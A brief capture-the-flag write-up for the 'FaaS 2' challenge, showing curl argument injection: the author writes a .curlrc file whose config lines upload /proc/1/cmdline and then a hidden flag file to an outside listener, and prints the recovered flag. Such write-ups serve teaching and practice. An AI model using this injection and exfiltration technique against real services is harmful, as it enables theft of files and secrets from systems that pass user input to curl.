# FaaS 2

<img width="480" height="535" alt="image" src="https://github.com/user-attachments/assets/e2ededae-6002-47cb-be1c-1b2436901f01" />



This was another curl argument injection challenge. Directly reading the flag was harder this time because its filename was hidden, and useful strings such as file were blocked.

Since `-o` was allowed, I used it to save a curl config as `/home/chall/.curlrc`. The config uploaded PID 1's command line to my listener:

```text
data-urlencode = "@/proc/1/cmdline"
url = "http://<listener>/recv"
```

data-urlencode was useful here because `/proc/1/cmdline` contains null bytes. The result revealed the literal socat command:

```text
./secretbinary1337 `cat what_even_is_this_file_name.txt`
```

I then replaced `.curlrc` with another config that uploaded the disclosed file:

```text
data = "@/srv/what_even_is_this_file_name.txt"
url = "http://<listener>/flag"
```

Triggering one more request sent back the flag:

```text
scriptCTF{bru73f0rc1ng_pr0c3ss_1d5????_167be07c6e95}
```
